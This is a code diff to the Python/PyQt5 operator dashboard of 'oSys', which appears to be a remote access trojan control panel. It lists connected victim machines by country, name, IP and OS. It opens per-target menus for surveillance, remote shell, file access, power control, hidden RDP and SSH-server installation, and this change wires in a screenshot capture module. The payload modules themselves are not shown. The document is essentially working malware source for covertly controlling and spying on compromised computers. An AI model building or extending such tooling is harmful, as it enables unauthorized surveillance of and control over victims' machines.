@@ -1,8 +1,8 @@
-from PyQt5.QtWidgets import *
+from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTableWidget, QAbstractItemView, QHeaderView, QHBoxLayout, QPushButton, QMessageBox, QCheckBox, QTableWidgetItem, QTabWidget, QTextEdit, QLineEdit, QApplication
 from PyQt5 import QtCore
-from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP
+from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
 import config
-import sys
+from sys import argv, exit
 from socket import error as socket_error
 
 
@@ -10,8 +10,9 @@ class Window(QWidget):
     def __init__(self):
         """ Initiates the main GUI window. """
         super().__init__()
-        self.setWindowTitle("oSys - Panel Dashboard | Made by Asaf and Rohy | Version: 0.5")
+        self.setWindowTitle("oSys - Panel Dashboard | Version: 1.0")
         self.resize(530, 350)
+        self.menu = Menu([0])
 
         # Create a top-level layout
         layout = QVBoxLayout()
@@ -21,7 +22,7 @@ class Window(QWidget):
         # Auto-Update Table data
         self.update_invoker = QtCore.QTimer()
         self.update_invoker.start(config.UPDATE_TABLE_COOLDOWN)
-        self.update_invoker.timeout.connect(self.update_table_data)
+        self.update_invoker.timeout.connect(self._update_table_data)
 
     # --- UI Tabs ---
     def dashboard_ui(self):
@@ -35,7 +36,7 @@ class Window(QWidget):
         self.table.setHorizontalHeaderLabels([' ', 'Country', 'Name', 'IP', 'OS', 'Task menu'])
 
         # Load table data
-        self.update_table_data()
+        self._update_table_data()
 
         # Set Layout
         button_layout = QHBoxLayout()
@@ -46,8 +47,8 @@ class Window(QWidget):
         dashboard_tab.setLayout(layout)
 
         # Set Selection buttons
-        select_all_button = QPushButton("Select all", clicked=lambda: self._select_all_row(select_state=True))
-        deselect_all_button = QPushButton("De-Select all", clicked=lambda: self._select_all_row(select_state=False))
+        select_all_button = QPushButton("Select all", clicked=lambda: self._select_all_rows(select_state=True))
+        deselect_all_button = QPushButton("De-Select all", clicked=lambda: self._select_all_rows(select_state=False))
         selected_users_menu_button = QPushButton("Menu - Selected Users", clicked=self._create_menu_selected)
         button_layout.addWidget(select_all_button)
         button_layout.addWidget(deselect_all_button)
@@ -63,30 +64,51 @@ class Window(QWidget):
         popup.setText("No users selected")
         popup.exec_()
 
-    # --- Public functions ---
-    def update_table_data(self):
-        """ This function updates the table according to the client list. """
+    def closeEvent(self, event):
+        """ Pops up a warning message asking the user if he's sure he wants to close the program. """
+        close = QMessageBox()
+        close.setWindowTitle('Server Is Running')
+        close.setText('Are you sure you want to close the program?')
+        close.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
+        close = close.exec()
 
+        if close == QMessageBox.Yes:
+            event.accept()
+        else:
+            event.ignore()
+
+    # --- Private functions ---
+    def _update_table_data(self):
+        """ This function updates the table according to the client list. """
         # Checks connections are still alive
-        for i in range(len(config.client_list)):
+        current_target = 0
+        for client in config.client_list:
             try:
-                conn = config.client_list[i]['data']['socket']
+                conn = client['data']['socket']
                 conn.send(''.encode())
+                current_target += 1
             except socket_error:
-                config.delete_client(i)
+                config.delete_client(current_target)
+                self.menu.setVisible(False)
 
         # Updates the table data
         self.table.clearContents()
         self.table.setRowCount(len(config.client_list))
         for i in range(self.table.rowCount()):
-            self.table.setCellWidget(i, 0, QCheckBox(checked=i in config.targets, clicked=(lambda i: lambda: self._on_checkbox_click(i))(i)))
+            checkbox = QCheckBox(checked=i in config.targets, clicked=(lambda i: lambda: self._on_checkbox_click(i))(i))
+            checkbox.setEnabled(not self.menu.isVisible())
+            self.table.setCellWidget(i, 0, checkbox)
             self.table.setItem(i, 1, QTableWidgetItem(config.client_list[i]['data']['countryCode']))
             self.table.setItem(i, 2, QTableWidgetItem(config.client_list[i]['data']['name']))
             self.table.setItem(i, 3, QTableWidgetItem(config.client_list[i]['ip']))
             self.table.setItem(i, 4, QTableWidgetItem(config.client_list[i]['data']['os']))
-            self.table.setCellWidget(i, 5, QPushButton("Menu {}".format(i + 1), clicked=(lambda i: lambda: Menu([i]).show())(i)))
+            self.table.setCellWidget(i, 5, QPushButton("Menu {}".format(i + 1), clicked=(lambda i: lambda: self._create_menu([i]))(i)))
 
-    # --- Private functions ---
+    def _set_row_selection_state(self, enabled=True):
+        """ Enables/Disables the state of the tick-boxes"""
+        for i in range(self.table.rowCount()):
+            self.table.cellWidget(i, 0).setEnabled(enabled)
+
     def _on_checkbox_click(self, target):
         """
         This function is being activated upon checkbox click.
@@ -98,7 +120,7 @@ class Window(QWidget):
         else:
             config.targets.remove(target)
 
-    def _select_all_row(self, select_state):
+    def _select_all_rows(self, select_state):
         """
         This function will select/de-select all the rows in the table
         :param select_state: Selection state. True=Ticked | False=Un-ticked
@@ -115,19 +137,26 @@ class Window(QWidget):
         """ This function creates a menu panel for all of the selected targets. If no target was selected, a error message would pop up"""
         for i in range(self.table.rowCount()):
             if self.table.cellWidget(i, 0).isChecked():
-                Menu(config.targets).show()
+                self._create_menu(config.targets)
                 return
         self.no_selected_users_error_ui()
 
+    def _create_menu(self, targets):
+        """ Creates a new menu - Closes old one. """
+        self.menu.close()
+        self.menu = Menu(targets)
+        self.menu.show()
+        self._set_row_selection_state(False)
+
 
 class Menu(QWidget):
-    def __init__(self, client_list):
+    def __init__(self, target_list):
         """ Initiates the control panel """
         super().__init__()
-        title = 'oSys - Menu ' + (str(client_list[0] + 1) if len(client_list) < 2 else 'for selected users')
+        title = 'oSys - Menu ' + (str(target_list[0] + 1) if len(target_list) < 2 else 'for selected users')
         self.setWindowTitle(title)
         self.resize(530, 350)
-        config.targets = client_list
+        config.targets = target_list
 
         # Create a top-level layout
         layout = QVBoxLayout()
@@ -135,12 +164,16 @@ class Menu(QWidget):
 
         # Create multiple tabs for each of the modules using their UI widgets
         tabs = QTabWidget()
-        if len(client_list) < 2:
+        if len(target_list) < 2:
             tabs.addTab(self.surveillance_ui(), "Surveillance")
         tabs.addTab(self.shell_ui(), "Shell")
         tabs.addTab(self.file_ui(), "File")
         tabs.addTab(self.power_ui(), "Power")
         layout.addWidget(tabs)
+
+    def closeEvent(self, event):
+        """ Enables the option to select clients in the client panel """
+        config.WIN._set_row_selection_state(True)
 
     # --- UI Tabs ---
     def surveillance_ui(self):
@@ -252,7 +285,7 @@ class Menu(QWidget):
     @staticmethod
     def screenshot_clicked():
         """ Initiates the screenshot module. """
-        print("screenshot clicked")  # WIP AHAHAHAHAHAAHAHH
+        Screenshot.screenshot()
 
     @staticmethod
     def install_ssh_server_clicked():
@@ -291,7 +324,7 @@ class Menu(QWidget):
 
 def start():
     """ Starts the GUI. """
-    app = QApplication(sys.argv)
-    win = Window()
-    win.show()
-    sys.exit(app.exec())
+    app = QApplication(argv)
+    config.WIN = Window()
+    config.WIN.show()
+    exit(app.exec())
